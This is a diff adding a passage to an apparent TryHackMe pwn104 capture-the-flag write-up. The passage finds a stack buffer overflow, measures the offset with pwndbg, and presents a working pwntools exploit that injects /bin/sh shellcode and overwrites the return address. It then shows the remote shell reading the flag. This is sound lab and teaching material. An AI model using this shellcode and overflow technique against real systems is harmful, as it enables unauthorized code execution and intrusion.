@@ -635,6 +635,167 @@ zsh: segmentation fault  ./pwn104-1644300377109.pwn104
 ```
 ---
 
+We observe that it leaks a stack address and accepts our input.
+
+Analyzing the binary in ghidra
+
+---
+
+<img width="1397" alt="Screenshot 2024-04-15 at 2 56 19 AM" src="https://github.com/Lynk4/THM/assets/44930131/ea6746c8-a433-4c83-8dc3-0e8b8bcdafff">
+
+
+---
+
+
+We observe what the programme does.
+
+1. Brings out the banner 
+2. Leaks the address of the beginning of our input buffer on the stack.
+3. Receives our input and reads 200 bytes of data into a buffer that can only hold up to 80 bytes of data. # Bug here
+
+So firstly we will find the offset:
+I'm using gdb
+
+---
+```bash
+pwndbg> cyclic 100
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+pwndbg> run
+Starting program: /home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go for a fight? 😏💪
+I'm waiting for you at 0x7fffffffe2c0
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040124e in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────[ REGISTERS / show-flags off / show-compact-regs off ]───────
+*RAX  0x65
+*RBX  0x7fffffffe428 —▸ 0x7fffffffe68a ◂— '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
+*RCX  0x7ffff7ec0a5d (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
+*RDX  0xc8
+ RDI  0x0
+*RSI  0x7fffffffe2c0 ◂— 0x6161616161616161 ('aaaaaaaa')
+*R8   0x78
+ R9   0x0
+*R10  0x7ffff7dd8b08 ◂— 0x10001200001a3f
+*R11  0x246
+ R12  0x0
+*R13  0x7fffffffe438 —▸ 0x7fffffffe6c3 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+ R14  0x0
+*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
+*RBP  0x616161616161616b ('kaaaaaaa')
+*RSP  0x7fffffffe318 ◂— 0x616161616161616c ('laaaaaaa')
+*RIP  0x40124e (main+129) ◂— ret 
+────────────────[ DISASM / x86-64 / set emulate on ]────────────────
+ ► 0x40124e <main+129>    ret    <0x616161616161616c>
+
+
+
+
+
+
+
+
+
+
+─────────────────────────────[ STACK ]──────────────────────────────
+00:0000│ rsp 0x7fffffffe318 ◂— 0x616161616161616c ('laaaaaaa')
+01:0008│     0x7fffffffe320 ◂— 0x7f0a6161616d
+02:0010│     0x7fffffffe328 —▸ 0x4011cd (main) ◂— push rbp
+03:0018│     0x7fffffffe330 ◂— 0x100400040 /* '@' */
+04:0020│     0x7fffffffe338 —▸ 0x7fffffffe428 —▸ 0x7fffffffe68a ◂— '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
+05:0028│     0x7fffffffe340 —▸ 0x7fffffffe428 —▸ 0x7fffffffe68a ◂— '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
+06:0030│     0x7fffffffe348 ◂— 0x36cf4868f6a97138
+07:0038│     0x7fffffffe350 ◂— 0x0
+───────────────────────────[ BACKTRACE ]────────────────────────────
+ ► 0         0x40124e main+129
+   1 0x616161616161616c
+   2   0x7f0a6161616d
+   3         0x4011cd main
+   4      0x100400040
+   5   0x7fffffffe428
+   6   0x7fffffffe428
+   7 0x36cf4868f6a97138
+────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l kaaaaaaa
+Finding cyclic pattern of 8 bytes: b'kaaaaaaa' (hex: 0x6b61616161616161)
+Found at offset 80
+pwndbg>
+```
+---
+Offset is 80 or 0x50 in hexadecimal
+
+we node 8 bytes more for the junk part
+
+let's craft the pyaload:
+
+---
+
+```python3
+from pwn import *
+
+context.binary = binary = "./pwn104-1644300377109.pwn104"
+
+# shellcode from : https://www.exploit-db.com/exploits/46907
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+#p = process()
+p = remote("10.10.16.230", 9004)
+
+p.recv()
+output = p.recv()
+
+buffer_address = int(output.split(b"at")[1].strip().decode("utf-8"), 16)
+
+payload = shellcode + b"A"*(0x50 - len(shellcode)) + b"B" * 0x8 + p64(buffer_address)
+
+p.sendline(payload)
+
+p.interactive()
+
+```
+
+---
+
+let's test it...........
+
+---
+```bash
+❯ python3 exploit.py
+[*] '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Opening connection to 10.10.16.230 on port 9004: Done
+[*] Switching to interactive mode
+$ ls
+flag.txt
+pwn104
+pwn104.c
+$ cat flag.txt
+THM{0h_n0o0o0o_h0w_Y0u_Won??}
+$
+```
+
+
+---
+
+---
 
 
 
